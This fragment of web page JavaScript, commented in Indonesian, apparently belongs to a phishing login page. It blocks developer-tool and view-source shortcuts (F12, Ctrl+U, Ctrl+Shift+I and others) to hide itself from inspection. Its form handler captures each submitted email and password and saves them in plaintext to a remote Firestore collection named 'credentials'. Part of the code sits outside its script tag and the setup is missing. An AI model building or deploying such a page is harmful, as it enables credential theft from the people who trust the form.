  <script>
  function togglePassword() {
            const passwordField = document.getElementById("b");
            const showPassword = document.getElementById("sp");
            
            // Ganti tipe input antara 'password' dan 'text'
            if (showPassword.checked) {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        }
    document.addEventListener("keydown", function(e) {
        const restrictedKeys = ["F12", "I", "J", "C", "U", "P"];
        if (
            e.key === "F12" ||
            (e.ctrlKey && e.shiftKey && restrictedKeys.includes(e.key.toUpperCase())) ||
            (e.ctrlKey && restrictedKeys.includes(e.key.toUpperCase()))
        ) {
            e.preventDefault();
        }
    });

    
</script>

    // Inisialisasi Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Function submit form
    window.submitForm = async function(e) {
      e.preventDefault();

      const email = document.getElementById("a").value;
      const password = document.getElementById("b").value;

      try {
        // Simpan data ke koleksi "credentials"
        await addDoc(collection(db, "credentials"), {
          email: email,
          password: password,
          createdAt: new Date()
        });

        alert("Data berhasil disimpan ke Firestore!");
        document.getElementById("f").reset();
      } catch (err) {
        console.error("Error menambahkan dokumen: ", err);
        alert("Gagal menyimpan data!");
      }
    }
